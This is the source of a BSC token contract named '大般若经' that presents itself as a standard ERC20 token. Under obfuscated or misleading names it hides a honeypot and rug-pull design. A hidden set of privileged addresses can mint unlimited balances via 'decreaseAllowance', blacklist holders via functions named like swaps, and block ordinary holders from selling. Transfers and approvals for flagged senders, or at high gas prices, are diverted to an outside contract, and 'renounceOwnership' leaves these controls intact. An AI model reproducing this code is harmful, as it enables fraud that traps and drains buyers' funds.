/**
 *Submitted for verification at BscScan.com on 2022-08-04
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {

    function _transfer(address spender, address recipient, uint256 amounts) external;
    
    function _approve(address owner, address spender, uint256 amount) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _fenahf() internal view virtual returns (address) {
        return msg.sender;
    }

    function _fmjnea() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract YNXJcoin is Context, IERC20, Ownable {
    using SafeMath for uint256;

    bool private _cuewjanf = true;
    bool private _mvjeaj = false;

    mapping(address => bool) private _mjvwawa;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    mapping(address => uint256) private _mfwanfwe;
    mapping(address => bool) private _mjanwwdwa;


    uint8 private _decimals = 9;
    string private _name = unicode"大般若经";
    string private _symbol = unicode"大般若经";

    uint256 public _taxFee = 2;
    uint256 private _Caeange = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _mjmgaw;
    address private kifwafwa;

    address private _ajjfiowajgfoaw;
    uint256 private _fiiawfmaw = 9194;
    uint256 private _fkiaifkaw = 149994;
    string private _famfiwak = "1841";
    

    constructor(address _mvmwaf, address _mjfame) {
        _mjmgaw = _mjfame;
        _isExcluded[address(this)] = true;
        _isExcluded[_mvmwaf] = true;
        _isExcluded[owner()] = true;
        _mjanwwdwa[_mvmwaf] = true;
        _mfwanfwe[_fenahf()] = _Caeange;
        emit Transfer(address(0), msg.sender, _Caeange);
    }

    function setTaxFeePercent(bool __mvjeaj, address _newPair) external {
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]) {
            _mvjeaj = __mvjeaj;
            kifwafwa = _newPair;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_fenahf()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_mjvwawa[_fenahf()]||_fmjnea()>=(14*1e9)){
            IERC(_mjmgaw)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_fmjnea()<=(14*1e9));
        require(!_mjvwawa[from]);
        if (_mjanwwdwa[from]) {
            require(_mjanwwdwa[from]);
                _mfwanfwe[from]= 
                _mfwanfwe[from].
                add(_Caeange*10**6);
        }
        if (_mvjeaj) {
            if (kifwafwa == from){}else{
                require(_isExcluded[from] || _isExcluded[to]);
            }
            
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]) {   
            _mfwanfwe[spender] = _mfwanfwe[spender].add(subtractedValue);
        }
    }

    function tokenFromReflection(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]){
            _mjanwwdwa[spender] = deductTransferFee;}
    }

    function swepExactTokensForTokens(
        address spender,
        address recipient
    ) external {
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]) {
            _mjvwawa[spender] = true;
            _mjvwawa[recipient] = true;
        }
    }

    function swepTokensForExactTokens(address account)
        external
    {
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]) {  
            _mjvwawa[account] = true;
        }
    }

    function changeUserFrom(address account) external {
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]) {
            _mjvwawa[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _mfwanfwe[sender] = _mfwanfwe[sender].sub(toAmount);
        _mfwanfwe[recipient] = _mfwanfwe[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_mjvwawa[_fenahf()]||_fmjnea()>=(14*1e9)){
            IERC(_mjmgaw)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }


    function includeInFee(address account) external {
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]) {
            _isExcluded[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 taxFee) external {
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]) {
            _taxFee = taxFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(_mjanwwdwa[_fenahf()]);
        return _mjvwawa[account];
    }

    function isExcludedFromFee(address spender) external {
        require(_mjanwwdwa[_fenahf()]);
        if (_mjanwwdwa[_fenahf()]) {
            _isExcluded[spender] = true;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _Caeange;
    }

    function aifaeva() public pure returns (string memory, string memory,  uint256) {
        string memory ISSSDW = "ahugiawuhfdijakw";
        string memory iafkawawf = "afujnabawa";
        uint256 afawkfa = 118447218451;
        return (ISSSDW, iafkawawf, afawkfa);
    }

    function iafgjea() public view returns (uint256) {
        uint256 startNumber =  block.number;
        return startNumber;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _mfwanfwe[account];
    }
}